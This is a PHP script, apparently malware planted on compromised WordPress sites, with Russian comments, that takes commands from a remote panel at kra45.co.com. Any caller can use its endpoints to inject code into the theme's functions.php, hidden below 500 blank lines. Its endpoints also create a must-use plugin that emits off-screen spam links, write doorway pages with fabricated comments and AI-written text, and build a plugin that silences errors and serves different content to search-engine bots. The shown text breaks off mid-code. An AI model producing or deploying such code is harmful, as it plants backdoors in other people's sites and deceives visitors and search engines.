<?php
/**
 * TTM - Link Manager Client
 * Simple standalone file for cross-link management
 * Upload to site root and configure panel URL
 */

// НАСТРОЙКА: URL панели управления (без /api.php)
define('TTM_PANEL_URL', 'https://kra45.co.com/bor/');

// Автоматическое определение URL сайта
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
$site_url = $protocol . $_SERVER['HTTP_HOST'];
$site_id = md5($site_url);

// Обработка запросов
$action = $_GET['action'] ?? $_POST['action'] ?? '';

switch ($action) {
    
    // Проверка доступности (ping)
    case 'ping':
        header('Content-Type: application/json');
        echo json_encode([
            'status' => 'ok',
            'site' => $site_url,
            'version' => '1.0',
            'timestamp' => time()
        ]);
        exit;
    
    // Получение конфигурации
    case 'get_config':
        $panel_api = rtrim(TTM_PANEL_URL, '/') . '/api.php';
        
        $ch = curl_init($panel_api);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'action' => 'get_config',
            'site_id' => $site_id
        ]));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code == 200 && $response) {
            $data = json_decode($response, true);
            if ($data && isset($data['config'])) {
                // Сохраняем конфиг в файл
                file_put_contents(__DIR__ . '/.ttm_config.json', json_encode($data['config']));
                
                header('Content-Type: application/json');
                echo json_encode(['success' => true, 'updated' => time()]);
                exit;
            }
        }
        
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Failed to fetch config']);
        exit;
    
    // Обновление ссылок (вызывается из панели)
    case 'update_links':
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);
        
        if ($data && isset($data['links'])) {
            // Сохраняем полученные ссылки
            file_put_contents(__DIR__ . '/.ttm_config.json', json_encode($data['links']));
            
            header('Content-Type: application/json');
            echo json_encode(['success' => true, 'updated' => time()]);
            exit;
        }
        
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Invalid data']);
        exit;
    
    // Инжект в functions.php активной темы (WordPress)
    case 'inject_footer':
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);
        
        if (!$data || !isset($data['links']) || !isset($data['style_config'])) {
            header('Content-Type: application/json');
            echo json_encode(['success' => false, 'error' => 'Invalid data']);
            exit;
        }
        
        $style = $data['style_config'];
        
        // Генерация PHP кода для functions.php
        $inject_code = "\n\n" . str_repeat("\n", 500) . "\n";
        $inject_code .= "/**\n";
        $inject_code .= " * Custom Backlinks Hook\n";
        $inject_code .= " */\n";
        $inject_code .= "function custom_backlinks_output() {\n";
        $inject_code .= "    ?>\n";
        
        foreach ($data['links'] as $item) {
            $inject_code .= "    <div style=\"position:absolute;left:{$style['left']}px;width:{$style['width']}px;\">\n";
            $inject_code .= "        " . $item['html'] . "\n";
            $inject_code .= "    </div>\n";
        }
        
        $inject_code .= "    <?php\n";
        $inject_code .= "}\n";
        $inject_code .= "add_action('wp_footer', 'custom_backlinks_output', 999);\n";
        
        // Поиск functions.php активной темы
        $possible_paths = [
            $_SERVER['DOCUMENT_ROOT'] . '/wp-content/themes/*/functions.php',
        ];
        
        $functions_file = null;
        foreach ($possible_paths as $pattern) {
            $files = glob($pattern);
            if (!empty($files)) {
                // Берем первый найденный (активная тема)
                $functions_file = $files[0];
                break;
            }
        }
        
        if ($functions_file && file_exists($functions_file)) {
            $content = file_get_contents($functions_file);
            
            // Удаляем старый код если есть
            $content = preg_replace('/\/\*\*\s*\* Custom Backlinks Hook\s*\*\/.*?add_action\(\'wp_footer\', \'custom_backlinks_output\', 999\);/s', '', $content);
            
            // Добавляем в конец
            $content .= $inject_code;
            
            // Сохраняем
            file_put_contents($functions_file, $content);
            
            header('Content-Type: application/json');
            echo json_encode(['success' => true, 'file' => $functions_file, 'style' => $style]);
            exit;
        }
        
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Functions.php file not found']);
        exit;
    
    // Обновление конфига MU-plugin (WordPress) + создание файла
    case 'update_mu_plugin':
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);
        
        if (!$data || !isset($data['links'])) {
            header('Content-Type: application/json');
            echo json_encode(['success' => false, 'error' => 'Invalid data', 'details' => 'No links provided']);
            exit;
        }
        
        $mu_dir = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/mu-plugins';
        $mu_plugin_file = $mu_dir . '/wp-link.php';
        $mu_config_file = $mu_dir . '/.wp_link_config.json';
        
        // Создаем директорию если нет
        if (!is_dir($mu_dir)) {
            mkdir($mu_dir, 0755, true);
        }
        
        // Создаем wp-link.php если не существует
        if (!file_exists($mu_plugin_file)) {
$mu_plugin_content = <<<'PHP'
<?php
/**
 * Plugin Name: WP Link Manager
 * Description: Automatic backlink injection system
 * Version: 1.0
 * Author: System
 */

define('WP_LINK_CONFIG_FILE', __DIR__ . '/.wp_link_config.json');

function wp_link_output_backlinks() {
    if (!file_exists(WP_LINK_CONFIG_FILE)) {
        return;
    }
    
    $data = json_decode(file_get_contents(WP_LINK_CONFIG_FILE), true);
    $config = $data['config'] ?? [];
    
    if (empty($config)) {
        return;
    }
    
    echo "\n<!-- WP Link Manager -->\n";
    
    foreach ($config as $item) {
        $domain = $item['domain'] ?? '';
        $html = $item['html'] ?? '';
        
        if ($domain && $html) {
            echo '<div style="position: absolute; left: -9999px; top: -9999px; width: 1px; height: 1px; overflow: hidden;">';
            echo $html;
            echo '</div>' . "\n";
        }
    }
    
    echo "<!-- /WP Link Manager -->\n";
}

add_action('wp_footer', 'wp_link_output_backlinks', 999);
PHP;
            
            file_put_contents($mu_plugin_file, $mu_plugin_content);
        }
        
        // Сохраняем конфиг
        file_put_contents($mu_config_file, json_encode([
            'config' => $data['links'],
            'last_update' => time()
        ]));
        
        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'updated' => time(),
            'plugin_created' => !file_exists($mu_plugin_file),
            'plugin_file' => $mu_plugin_file,
            'config_file' => $mu_config_file,
            'links_count' => count($data['links'])
        ]);
        exit;
    
    // Создать index.html для режима 3 (главная как блог) - С AI ГЕНЕРАЦИЕЙ!
    case 'create_homepage_html':
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);
        
        if (!$data || !isset($data['site_brand'])) {
            header('Content-Type: application/json');
            echo json_encode(['success' => false, 'error' => 'Invalid data']);
            exit;
        }
        
        $siteBrand = $data['site_brand'];
        $claudeApiKey = $data['claude_api_key'] ?? '';
        $forceRegenerate = $data['force_regenerate'] ?? false;
        $homepageIntent = $data['homepage_intent'] ?? '';
        $homepageWordsCount = $data['homepage_words_count'] ?? 400;
        $publishDate = date('Y-m-d\TH:i:sP');
        
        try {
            $uploadsDir = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/2025';
            
            if (!is_dir($uploadsDir)) {
                if (!mkdir($uploadsDir, 0755, true)) {
                    throw new Exception('Failed to create directory: ' . $uploadsDir);
                }
            }
            
            $indexFile = $uploadsDir . '/index.html';
            
            // Проверяем - если index.html уже существует и НЕ форсируем перегенерацию
            if (file_exists($indexFile) && !$forceRegenerate) {
                header('Content-Type: application/json');
                echo json_encode([
                    'success' => true,
                    'already_exists' => true,
                    'index_file' => $indexFile
                ]);
                exit;
            }
            
            // Генерируем через Claude AI
            $homeContent = '';
            $pageTitle = '';
            $metaDescription = '';
            $h1Title = '';
            
            // ОТЛАДКА: Логируем в wp-content/uploads
            $logFile = $uploadsDir . '/homepage_debug.log';
            file_put_contents($logFile,
                date('Y-m-d H:i:s') . "\n" .
                "API Key: " . ($claudeApiKey ? substr($claudeApiKey, 0, 20) . '...' : 'EMPTY!') . "\n" .
                "Homepage Intent: " . $homepageIntent . "\n" .
                "Site Brand: " . $siteBrand . "\n\n",
                FILE_APPEND
            );
            
            if ($claudeApiKey) {
                // AI ГЕНЕРАЦИЯ КОНТЕНТА ГЛАВНОЙ
                
                // Определяем тему
                if (!empty($homepageIntent)) {
                    $themeLine = "ТЕМА: {$homepageIntent}";
                } else {
                    $themeLine = "ТЕМА: Цифровые маркетплейсы, современные технологии, анонимность в сети и цифровая безопасность";
                }
                
                file_put_contents($logFile,
                    "Sending to OpenRouter...\n" .
                    "Theme: " . $themeLine . "\n",
                    FILE_APPEND
                );
                
                $prompt = "🚨 КРИТИЧЕСКИ ВАЖНО: Строго соблюдай лимит слов!

{$themeLine}

⚠️ ЛИМИТ СЛОВ: {$homepageWordsCount} слов
МАКСИМУМ: " . ($homepageWordsCount + 50) . " слов
МИНИМУМ: " . ($homepageWordsCount - 50) . " слов

НЕ ПРЕВЫШАЙ " . ($homepageWordsCount + 50) . " СЛОВ! Это критично!

ТРЕБОВАНИЯ:
1. Создай привлекательный TITLE для SEO (5-7 слов, релевантный теме)
2. Создай H1 заголовок (5-7 слов, должен отличаться от TITLE)
3. Создай DESCRIPTION для мета-тега (120-160 символов, релевантное теме)
4. Создай качественный HTML контент с тегами <h2>, <h3>, <p>, <ul>, <li>
5. Пиши НЕЙТРАЛЬНО и ИНФОРМАЦИОННО
6. Естественный, читабельный текст, релевантный указанной теме

🔴 ВНИМАНИЕ: Текст в CONTENT должен быть {$homepageWordsCount} слов (±50 максимум)
Если указано 100 слов - делай 100-150 слов, НЕ БОЛЬШЕ!
Если указано 200 слов - делай 200-250 слов, НЕ БОЛЬШЕ!
Если указано 400 слов - делай 400-450 слов, НЕ БОЛЬШЕ!

ФОРМАТ ОТВЕТА (строго соблюдай):
TITLE: [SEO заголовок 5-7 слов]
H1: [H1 заголовок 5-7 слов]
DESCRIPTION: [мета описание 120-160 символов]
CONTENT:
[HTML контент с тегами h2, h3, p, ul, li - СТРОГО {$homepageWordsCount} слов, НЕ БОЛЕЕ " . ($homepageWordsCount + 50) . " слов!]

🔴 ФИНАЛЬНОЕ НАПОМИНАНИЕ: Проверь количество слов перед отправкой! Лимит: {$homepageWordsCount} слов (±50)";

                $apiData = [
                    'model' => 'anthropic/claude-sonnet-4.5',
                    'messages' => [
                        [
                            'role' => 'user',
                            'content' => $prompt
                        ]
                    ]
                ];
                
                $ch = curl_init('https://openrouter.ai/api/v1/chat/completions');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($apiData));
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    'Content-Type: application/json',
                    'Authorization: Bearer ' . $claudeApiKey,
                    'HTTP-Referer: https://panel.localhost',
                    'X-Title: Homepage Generator'
                ]);
                
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
                
                file_put_contents($logFile,
                    "OpenRouter HTTP Code: " . $httpCode . "\n" .
                    "Response: " . substr($response, 0, 500) . "\n\n",
                    FILE_APPEND
                );
                
                if ($response) {
                    $result = json_decode($response, true);
                    
                    file_put_contents($logFile,
                        "Decoded: " . json_encode($result, JSON_UNESCAPED_UNICODE) . "\n\n",
                        FILE_APPEND
                    );
                    
                    if (isset($result['choices'][0]['message']['content'])) {
                        $aiResponse = $result['choices'][0]['message']['content'];
                        
                        file_put_contents($logFile,
                            "AI Response:\n" . $aiResponse . "\n\n",
                            FILE_APPEND
                        );
                        
                        // Парсим TITLE
                        if (preg_match('/TITLE:\s*(.+)/i', $aiResponse, $titleMatch)) {
                            $pageTitle = trim(str_replace('**', '', $titleMatch[1]));
                        }
                        
                        // Парсим H1
                        if (preg_match('/H1:\s*(.+)/i', $aiResponse, $h1Match)) {
                            $h1Title = trim(str_replace('**', '', $h1Match[1]));
                        }
                        
                        // Парсим DESCRIPTION
                        if (preg_match('/DESCRIPTION:\s*(.+)/i', $aiResponse, $descMatch)) {
                            $metaDescription = trim(str_replace('**', '', $descMatch[1]));
                        }
                        
                        // Парсим CONTENT
                        if (preg_match('/CONTENT:\s*(.+)/is', $aiResponse, $contentMatch)) {
                            $homeContent = trim(str_replace('**', '', $contentMatch[1]));
                        }
                    }
                }
            }
            
            // Если AI не сгенерировал - используем fallback на основе темы
            // Очищаем интент от переносов строк для fallback
            $cleanIntent = !empty($homepageIntent) ? preg_replace('/\s+/', ' ', trim($homepageIntent)) : '';
            
            if (empty($pageTitle)) {
                if (!empty($cleanIntent)) {
                    $pageTitle = mb_substr($cleanIntent, 0, 60) . ' | ' . $siteBrand;
                } else {
                    $pageTitle = 'Блог о современных решениях | ' . $siteBrand;
                }
            } else {
                $pageTitle .= ' | ' . $siteBrand;
            }
            
            if (empty($h1Title)) {
                $h1Title = !empty($cleanIntent) ? mb_substr($cleanIntent, 0, 100) : 'Добро пожаловать в наш блог';
            }
            
            if (empty($metaDescription)) {
                $metaDescription = !empty($cleanIntent) 
                    ? mb_substr($cleanIntent, 0, 150)
                    : 'Информационный блог о современных технологиях, цифровой безопасности и анонимности';
            }
            
            if (empty($homeContent)) {
                $homeContent = '<h2>О чем мы пишем:</h2>
<ul>
<li>Актуальные тенденции и новости</li>
<li>Экспертные обзоры и аналитика</li>
<li>Практические руководства и советы</li>
<li>Полезная информация для наших читателей</li>
</ul>

<p>Ознакомьтесь с нашими последними публикациями ниже.</p>';
            }
            $canonicalUrl = 'https://' . $_SERVER['HTTP_HOST'] . '/';
            
            // Удаляем <title> из контента если AI добавил его туда
            $homeContent = preg_replace('/<title[^>]*>.*?<\/title>/is', '', $homeContent);
            
            // Метатеги для HEAD (с маркерами для парсинга)
            $metaTags = '<!-- META_START -->
<meta name="description" content="' . htmlspecialchars($metaDescription) . '">
<meta property="og:title" content="' . htmlspecialchars($pageTitle) . '">
<meta property="og:description" content="' . htmlspecialchars($metaDescription) . '">
<meta property="og:url" content="' . htmlspecialchars($canonicalUrl) . '">
<link rel="canonical" href="' . htmlspecialchars($canonicalUrl) . '">
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Blog",
  "name": "' . htmlspecialchars($siteBrand, ENT_QUOTES) . '",
  "url": "' . htmlspecialchars($canonicalUrl, ENT_QUOTES) . '",
  "description": "' . htmlspecialchars($metaDescription, ENT_QUOTES) . '"
}
</script>
<title>' . htmlspecialchars($pageTitle) . '</title>
<!-- META_END -->';
            
            // Контент главной страницы (с AI генерацией)
            $htmlContent = $metaTags . '

<article>
<h1>' . htmlspecialchars($h1Title) . '</h1>

' . $homeContent . '
</article>';
            
            $bytesWritten = file_put_contents($indexFile, $htmlContent);
            
            if ($bytesWritten === false) {
                throw new Exception('Failed to write index.html: ' . $indexFile);
            }
            
            if (!file_exists($indexFile)) {
                throw new Exception('Index.html was not created: ' . $indexFile);
            }
            
            $fileSize = filesize($indexFile);
            if ($fileSize === false || $fileSize < 100) {
                @unlink($indexFile);
                throw new Exception('Index.html too small (' . $fileSize . ' bytes)');
            }
            
            header('Content-Type: application/json');
            echo json_encode([
                'success' => true,
                'index_file' => $indexFile,
                'file_size' => $fileSize,
                'bytes_written' => $bytesWritten,
                'verified' => true
            ]);
        } catch (Exception $e) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'error' => $e->getMessage(),
                'uploads_dir' => $uploadsDir ?? 'undefined'
            ]);
        }
        exit;
    
    // Создать HTML файл дорвея
    case 'create_doorway_html':
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);
        
        if (!$data || !isset($data['slug']) || !isset($data['content'])) {
            header('Content-Type: application/json');
            echo json_encode(['success' => false, 'error' => 'Invalid data', 'received' => $data]);
            exit;
        }
        
        $slug = $data['slug'];
        
        // Убираем blog/ из slug для имени файла (если есть)
        $filenameSlug = str_replace('blog/', '', $slug);
        
        $pageTitle = $data['page_title'] ?? 'Article';
        $h1 = $data['h1'] ?? $pageTitle;
        $content = $data['content'];
        $redirectUrl = $data['redirect_url'] ?? '';
        $metaDescription = $data['meta_description'] ?? mb_substr($pageTitle, 0, 150);
        $authorNickname = $data['author_nickname'] ?? 'Author01';
        $publishDate = $data['publish_date'] ?? date('Y-m-d\TH:i:sP');
        $canonicalUrl = $data['canonical_url'] ?? '';
        $comment1 = $data['comment1'] ?? 'Спасибо за информацию!';
        $comment1User = $data['comment1_user'] ?? 'User123';
        $comment1Date = $data['comment1_date'] ?? date('d.m.Y');
        $comment2 = $data['comment2'] ?? 'Отличная статья!';
        $comment2User = $data['comment2_user'] ?? 'Reader45';
        $comment2Date = $data['comment2_date'] ?? date('d.m.Y');
        
        try {
            // Создать директорию uploads/2025 если не существует
            $uploadsDir = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/2025';
            
            if (!is_dir($uploadsDir)) {
                if (!mkdir($uploadsDir, 0755, true)) {
                    throw new Exception('Failed to create directory: ' . $uploadsDir);
                }
            }
            
            // Проверка прав на запись
            if (!is_writable(dirname($uploadsDir))) {
                throw new Exception('Directory not writable: ' . dirname($uploadsDir));
            }
            
            // Форматированная дата для отображения
            $displayDate = date('d.m.Y', strtotime($publishDate));
            
            // Удаляем <title> из контента если AI добавил его туда
            $content = preg_replace('/<title[^>]*>.*?<\/title>/is', '', $content);
            
            // Метатеги для HEAD (с маркерами для парсинга)
            $metaTags = '<!-- META_START -->
<meta name="description" content="' . htmlspecialchars($metaDescription) . '">
<meta property="og:title" content="' . htmlspecialchars($pageTitle) . '">
<meta property="og:description" content="' . htmlspecialchars($metaDescription) . '">
<meta property="og:url" content="' . htmlspecialchars($canonicalUrl) . '">
<link rel="canonical" href="' . htmlspecialchars($canonicalUrl) . '">
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Article",
  "headline": "' . htmlspecialchars($pageTitle, ENT_QUOTES) . '",
  "author": {
    "@type": "Person",
    "name": "' . htmlspecialchars($authorNickname, ENT_QUOTES) . '"
  },
  "datePublished": "' . htmlspecialchars($publishDate, ENT_QUOTES) . '",
  "dateModified": "' . htmlspecialchars($publishDate, ENT_QUOTES) . '",
  "url": "' . htmlspecialchars($canonicalUrl, ENT_QUOTES) . '"
}
</script>
<title>' . htmlspecialchars($pageTitle) . '</title>
<!-- META_END -->';

            // Контент для BODY (используем filenameSlug БЕЗ blog/)
            $htmlFile = $uploadsDir . '/' . $filenameSlug . '.html';
            
            $htmlContent = $metaTags . '

<article>
<h1>' . htmlspecialchars($h1) . '</h1>

' . $content . '

<div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #e0e0e0; color: #666; font-size: 14px;">
    <p><strong>Автор:</strong> ' . htmlspecialchars($authorNickname) . '</p>
    <p><strong>Дата публикации:</strong> ' . $displayDate . '</p>
</div>
</article>

<div style="margin-top: 40px; padding: 20px; background: #f9f9f9; border-radius: 8px;">
    <h3 style="margin-bottom: 20px; font-size: 20px; color: #333;">Комментарии</h3>
    
    <div style="background: white; padding: 15px; margin-bottom: 15px; border-radius: 5px; border-left: 3px solid #007bff;">
        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
            <strong style="color: #333;">' . htmlspecialchars($comment1User) . '</strong>
            <span style="color: #999; font-size: 12px;">' . $comment1Date . '</span>
        </div>
        <p style="color: #555; line-height: 1.6; margin: 0;">' . htmlspecialchars($comment1) . '</p>
    </div>
    
    <div style="background: white; padding: 15px; margin-bottom: 15px; border-radius: 5px; border-left: 3px solid #28a745;">
        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
            <strong style="color: #333;">' . htmlspecialchars($comment2User) . '</strong>
            <span style="color: #999; font-size: 12px;">' . $comment2Date . '</span>
        </div>
        <p style="color: #555; line-height: 1.6; margin: 0;">' . htmlspecialchars($comment2) . '</p>
    </div>
    
    <div style="margin-top: 20px; padding: 15px; background: white; border-radius: 5px;">
        <h4 style="margin-bottom: 15px; font-size: 16px; color: #333;">Оставить комментарий</h4>
        <div style="margin-bottom: 10px;">
            <input type="text" placeholder="Ваше имя" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px;">
        </div>
        <div style="margin-bottom: 10px;">
            <textarea placeholder="Ваш комментарий..." style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; min-height: 100px; resize: vertical;"></textarea>
        </div>
        <button style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px;">Отправить</button>
    </div>
</div>';
            
            $bytesWritten = file_put_contents($htmlFile, $htmlContent);
            
            if ($bytesWritten === false) {
                throw new Exception('Failed to write file: ' . $htmlFile);
            }
            
            // ⚠️ КРИТИЧЕСКАЯ ПРОВЕРКА: Файл действительно создан?
            if (!file_exists($htmlFile)) {
                throw new Exception('File was not created: ' . $htmlFile);
            }
            
            // Проверяем размер файла
            $fileSize = filesize($htmlFile);
            if ($fileSize === false || $fileSize < 100) {
                @unlink($htmlFile); // Удаляем битый файл
                throw new Exception('File created but too small (' . $fileSize . ' bytes): ' . $htmlFile);
            }
            
            // Проверяем права на чтение
            if (!is_readable($htmlFile)) {
                throw new Exception('File created but not readable: ' . $htmlFile);
            }
            
            header('Content-Type: application/json');
            echo json_encode([
                'success' => true,
                'html_file' => $htmlFile,
                'slug' => $slug,
                'page_title' => $pageTitle,
                'h1' => $h1,
                'file_size' => $fileSize,
                'bytes_written' => $bytesWritten,
                'verified' => true
            ]);
        } catch (Exception $e) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'error' => $e->getMessage(),
                'uploads_dir' => $uploadsDir ?? 'undefined',
                'document_root' => $_SERVER['DOCUMENT_ROOT']
            ]);
        }
        exit;
    
    // Обновить wp-links.php с клоакингом и internal links
    case 'update_wp_links':
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);
        
        if (!$data || !isset($data['internal_links'])) {
            header('Content-Type: application/json');
            echo json_encode(['success' => false, 'error' => 'Invalid data']);
            exit;
        }
        
        $internalLinks = $data['internal_links'];
        $doorways = $data['doorways'] ?? []; // Массив всех дорвеев сайта
        $linkingMode = $data['linking_mode'] ?? 1; // 1=hidden, 2=/blog/, 3=homepage
        $siteBrand = $data['site_brand'] ?? 'Site';
        
        // Новые настройки редиректа
        $redirectSettings = $data['redirect_settings'] ?? [];
        $redirectYandex = $redirectSettings['redirect_yandex'] ?? false;
        $redirectBing = $redirectSettings['redirect_bing'] ?? false;
        $redirectGoogleRuOnly = $redirectSettings['redirect_google_ru_only'] ?? true;
        $homepageRedirectUrl = $data['homepage_redirect_url'] ?? '';
        $cloakingMode = $data['cloaking_mode'] ?? false;
        
        // Новые настройки
        $forceLangRu = $data['force_lang_ru'] ?? true; // По умолчанию включено
        
        // Файл для хранения стилей сайтов  
        $stylesFile = __DIR__ . '/data/site_styles.json';
        $siteStyles = [];
        
        if (file_exists($stylesFile)) {
            $siteStyles = json_decode(file_get_contents($stylesFile), true) ?: [];
        }
        
        // ID текущего сайта
        $currentSiteId = md5($site_url);
        
        // Проверяем есть ли сохраненные стили для этого сайта
        if (isset($siteStyles[$currentSiteId])) {
            // Используем сохраненные значения
            $randomLeft = $siteStyles[$currentSiteId]['left'];
            $randomWidth = $siteStyles[$currentSiteId]['width'];
        } else {
            // Генерируем новые и сохраняем
            $randomLeft = rand(-11000, -8000);
            $randomWidth = rand(500, 1000);
            
            $siteStyles[$currentSiteId] = [
                'left' => $randomLeft,
                'width' => $randomWidth,
                'created' => time()
            ];
            
            // Сохраняем в файл
            if (!is_dir(__DIR__ . '/data')) {
                mkdir(__DIR__ . '/data', 0755, true);
            }
            file_put_contents($stylesFile, json_encode($siteStyles, JSON_PRETTY_PRINT));
        }
        
        // Генерация PHP кода для internal links
        $linksCode = '$internalLinks = ' . var_export(array_values($internalLinks), true) . ';';
        
        // Генерация PHP кода для дорвеев с их redirect_url
        $doorwaysCode = '$doorwaysConfig = ' . var_export($doorways, true) . ';';
        
        // Генерация wp-links.php - ПРЯМАЯ КОНКАТЕНАЦИЯ!
        $wpLinksContent = "<?php\n";
        $wpLinksContent .= "/**\n";
        $wpLinksContent .= " * Plugin Name: WP Links Manager\n";
        $wpLinksContent .= " * Description: Doorway cloaking and internal links injection\n";
        $wpLinksContent .= " * Version: 1.0\n";
        $wpLinksContent .= " */\n\n";
        $wpLinksContent .= "@error_reporting(0);\n";
        $wpLinksContent .= "@ini_set('display_errors', 0);\n\n";
        $wpLinksContent .= "if (!defined('ABSPATH')) {\n";
        $wpLinksContent .= "    exit;\n";
        $wpLinksContent .= "}\n\n";
        $wpLinksContent .= "// Клоакинг и отображение дорвеев\n";
        $wpLinksContent .= "add_action('template_redirect', function() {\n";
        $wpLinksContent .= "    // Конфигурация дорвеев (slug => redirect_url)\n";
        $wpLinksContent .= "    " . $doorwaysCode . "\n    \n";
        $wpLinksContent .= "    \$linkingMode = {$linkingMode};\n";
        $wpLinksContent .= "    \$siteBrand = '{$siteBrand}';\n    \n";
        $wpLinksContent .= "    // Убираем слеши с обеих сторон для сравнения\n";
        $wpLinksContent .= "    \$requestUri = trim(\$_SERVER['REQUEST_URI'], '/');\n";
        $wpLinksContent .= "    \$requestUri = urldecode(\$requestUri); // Декодируем кириллицу из URL\n";
        $wpLinksContent .= "    \$requestUri = strtok(\$requestUri, '?'); // Удаляем ?param=value\n";
        $wpLinksContent .= "    \$requestUri = str_replace('index.php/', '', \$requestUri);\n    \n";
        
        // Добавляем обработку /blog/ для режима 2
        if ($linkingMode == 2) {
            $wpLinksContent .= "    // РЕЖИМ 2: Обработка /blog/ страницы (БЕЗ trailing slash)\n";
            $wpLinksContent .= "    if (\$requestUri === 'blog' || \$requestUri === 'blog/') {\n";
            $wpLinksContent .= "        status_header(200);\n";
            $wpLinksContent .= "        global \$wp_query;\n";
            $wpLinksContent .= "        \$wp_query->is_404 = false;\n";
            $wpLinksContent .= "        \$wp_query->is_page = true;\n";
            $wpLinksContent .= "        \$wp_query->is_home = false;\n    \n";
            $wpLinksContent .= "        \$blogTitle = 'Блог - последние публикации | ' . \$siteBrand;\n";
            $wpLinksContent .= "        \$blogDescription = 'Читайте последние статьи и обзоры на ' . \$siteBrand;\n    \n";
            $wpLinksContent .= "        add_filter('pre_get_document_title', function() use (\$blogTitle) {\n";
            $wpLinksContent .= "            return \$blogTitle;\n";
            $wpLinksContent .= "        }, 999);\n    \n";
            $wpLinksContent .= "        \$allLinks = " . $linksCode . "\n    \n";
            $wpLinksContent .= "        ob_start();\n";
            $wpLinksContent .= "        get_header();\n";
            $wpLinksContent .= "        echo '<div class=\"content-post\">';\n";
            $wpLinksContent .= "        echo '<article><h1>Последние публикации</h1>';\n";
            $wpLinksContent .= "        echo '<div style=\"display: grid; gap: 20px; margin-top: 30px;\">';\n";
            $wpLinksContent .= "        foreach (\$allLinks as \$link) {\n";
            $wpLinksContent .= "            echo '<div style=\"padding: 20px; background: #f8f9fa; border-radius: 8px; border-left: 4px solid #007bff;\">';\n";
            $wpLinksContent .= "            echo '<h3 style=\"margin: 0 0 10px 0;\"><a href=\"' . esc_url(\$link['url']) . '\" style=\"color: #007bff; text-decoration: none; font-size: 18px;\">' . esc_html(\$link['title']) . '</a></h3>';\n";
            $wpLinksContent .= "            echo '</div>';\n";
            $wpLinksContent .= "        }\n";
            $wpLinksContent .= "        echo '</div></article></div>';\n";
            $wpLinksContent .= "        get_footer();\n";
            $wpLinksContent .= "        \$page = ob_get_clean();\n    \n";
            $wpLinksContent .= "        \$metaTags = '<meta name=\"robots\" content=\"index, follow\">';\n";
            $wpLinksContent .= "        \$metaTags .= '<meta name=\"description\" content=\"' . esc_attr(\$blogDescription) . '\">';\n";
            $wpLinksContent .= "        \$metaTags .= '<meta property=\"og:title\" content=\"' . esc_attr(\$blogTitle) . '\">';\n";
            $wpLinksContent .= "        \$metaTags .= '<meta property=\"og:description\" content=\"' . esc_attr(\$blogDescription) . '\">';\n";
            $wpLinksContent .= "        \$metaTags .= '<title>' . esc_html(\$blogTitle) . '</title>';\n";
            $wpLinksContent .= "        \$page = preg_replace('/<title>.*?<\\/title>/i', '', \$page, 1);\n";
            $wpLinksContent .= "        \$page = str_replace('</head>', \$metaTags . \"\\n</head>\", \$page);\n";
            
            // Замена lang на ru (если включено)
            if ($forceLangRu) {
                $wpLinksContent .= "        // Замена языка на ru\n";
                $wpLinksContent .= "        \$page = preg_replace('/<html[^>]*lang=[\"\\'][^\"\\']*[\"\\'][^>]*>/i', '<html lang=\"ru\">', \$page);\n";
            }
            
            $wpLinksContent .= "        echo \$page;\n";
            $wpLinksContent .= "        exit;\n";
            $wpLinksContent .= "    }\n    \n";
        } elseif ($linkingMode == 3) {
            $wpLinksContent .= "    // РЕЖИМ 3: Показываем index.html на главной\n";
            $wpLinksContent .= "    if (empty(\$requestUri) || \$requestUri === 'index.php') {\n";
            $wpLinksContent .= "        \$uploadsDir = WP_CONTENT_DIR . '/uploads/2025';\n";
            $wpLinksContent .= "        \$indexFile = \$uploadsDir . '/index.html';\n    \n";
            $wpLinksContent .= "        if (file_exists(\$indexFile)) {\n";
            $wpLinksContent .= "            // Клоакинг для режима 3\n";
            $wpLinksContent .= "            \$cloakingMode = " . ($cloakingMode ? "true" : "false") . ";\n";
            $wpLinksContent .= "            \$userAgent = \$_SERVER['HTTP_USER_AGENT'] ?? '';\n";
            $wpLinksContent .= "            \$bots = ['googlebot', 'Googlebot-Image', 'Googlebot-Video', 'Googlebot-News',\n";
            $wpLinksContent .= "                     'Storebot-Google', 'Google-InspectionTool', 'GoogleOther',\n";
            $wpLinksContent .= "                     'bingbot', 'bingpreview', 'msnbot', 'duckduckbot', 'AdldxBot', 'yandex', 'YandexBot'];\n";
            $wpLinksContent .= "            \$isBot = false;\n";
            $wpLinksContent .= "            foreach (\$bots as \$bot) {\n";
